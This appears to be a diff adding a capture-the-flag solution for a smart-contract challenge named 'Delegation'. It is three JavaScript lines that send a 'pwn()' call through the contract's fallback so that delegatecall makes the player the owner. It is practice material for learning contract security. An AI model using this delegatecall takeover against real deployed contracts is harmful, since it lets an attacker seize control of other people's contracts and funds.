@@ -1,0 +1,5 @@
+Level 6: Delegation
+
+signature = web3.eth.abi.encodeFunctionSignature("pwn()")
+await contract.sendTransaction({ from: player, data: signature })
+await contract.owner() === player
